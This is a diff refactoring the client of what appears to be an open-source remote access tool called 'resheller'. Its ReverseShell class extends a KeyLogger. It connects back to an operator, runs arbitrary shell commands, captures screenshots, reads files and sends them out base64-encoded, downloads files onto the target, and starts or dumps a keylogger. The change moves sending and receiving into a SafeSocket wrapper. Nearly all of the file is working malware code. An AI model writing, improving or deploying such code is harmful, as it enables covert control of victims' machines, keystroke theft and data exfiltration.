@@ -1,6 +1,5 @@
 #!/usr/bin/env python
 from base64 import b64encode
-from json import dumps, loads
 from os import chdir, environ, path, remove, listdir, name
 from shutil import copyfile
 from socket import socket, AF_INET, SOCK_STREAM
@@ -14,6 +13,7 @@ from requests import get
 
 from resheller.src.client.ip import get_ip
 from resheller.src.client.keylogger import KeyLogger
+from resheller.src.pipe.safe_socket import SafeSocket
 
 
 class ReverseShell(KeyLogger):
@@ -22,6 +22,7 @@ class ReverseShell(KeyLogger):
     def __init__(self):
         super().__init__()
         self.sock = socket(AF_INET, SOCK_STREAM)
+        self.safe_sock = SafeSocket(self.sock)
 
     def connect(self):
         ip = get_ip()
@@ -55,7 +56,7 @@ class ReverseShell(KeyLogger):
                     pass
         except ValueError:
             pass
-        self.safe_send(priv)
+        self.safe_sock.send(priv)
 
     def screenshot(self):
         try:
@@ -63,16 +64,18 @@ class ReverseShell(KeyLogger):
                 screenshot.shot()
             with open("monitor-1.png", "rb") as capture:
                 capture = b64encode(capture.read())
-                self.safe_send(capture.decode('utf-8'))
+                image = capture.decode("utf-8")
+                self.safe_sock.send(image)
             remove("monitor-1.png")
         except ValueError:
             prompt = "\n[!] Failed to Take Screenshot\n"
-            self.safe_send(prompt)
+            self.safe_sock.send(prompt)
 
     def download(self, command):
         with open(command[9:], 'rb') as file:
             result = b64encode(file.read())
-            self.safe_send(result.decode('utf-8'))
+            payload = result.decode("utf-8")
+            self.safe_sock.send(payload)
 
     def get_request(self, command):
         try:
@@ -82,29 +85,29 @@ class ReverseShell(KeyLogger):
             with open(file_name, 'wb') as out_file:
                 out_file.write(get_response.content)
             prompt = f'[+] Downloaded "{file_name} to Target'
-            self.safe_send(prompt)
         except ValueError:
             prompt = "[!] Failed to Downloaded File"
-            self.safe_send(prompt)
+        self.safe_sock.send(prompt)
 
     def start(self, command):
         try:
             Popen(command[6:], shell=True)
-            self.safe_send(f"[+] Started {command[6:]}")
+            prompt = f"[+] Started {command[6:]}"
         except ValueError:
             prompt = f"[!] Failed to Start {command[6:]}"
-            self.safe_send(prompt)
+        self.safe_sock.send(prompt)
 
     def return_proc(self, command):
         proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
         result = proc.stdout.read() + proc.stderr.read()
-        self.safe_send(result.decode('utf-8'))
+        stdout = result.decode("utf-8")
+        self.safe_sock.send(stdout)
 
     def keylogger(self, command):
         if command[10:] == 'start':
             t1 = Thread(target=self.listen)
             t1.start()
-            self.safe_send("[+] Started Keylogger")
+            payload = "[+] Started Keylogger"
         elif command[10:] == 'dump':
             payload = "[!] No Logs Found\n"
             if path.isfile(self.log_path):
@@ -112,33 +115,28 @@ class ReverseShell(KeyLogger):
                     payload = log_file.read()
                     log_file.close()
                 remove(self.log_path)
-            self.safe_send(payload)
-
-    def safe_send(self, data: str):
-        json_data = dumps(data)
-        self.sock.send(json_data.encode('utf-8'))
-
-    def safe_recv(self):
-        data = ""
-        while True:
-            try:
-                data = data + self.sock.recv(1024).decode()
-                return loads(data)
-            except ValueError:
-                continue
+        else:
+            payload = (
+                "[!] Usage:\n\n"
+                "keylogger <opt>    --> <start> --> start keylogger on target\n"
+                "                       <dump>  --> retrieve logs from target\n"
+            )
+        self.safe_sock.send(payload)
 
     def change_dir(self, command):
         try:
             chdir(command[3:])
-            self.safe_send("[+]")
+            payload = "[+]"
         except (FileNotFoundError, OSError):
-            self.safe_send("[!] Directory Not Found")
+            payload = "[!] Directory Not Found"
+        self.safe_sock.send(payload)
 
     def shell(self):
         while True:
-            command = self.safe_recv()
+            command = self.safe_sock.recv()
             if command == "get_os":
-                self.safe_send(name == "nt")
+                windows = (name == "nt")
+                self.safe_sock.send(windows)
             elif command == "exit":
                 self.sock.close()
                 break
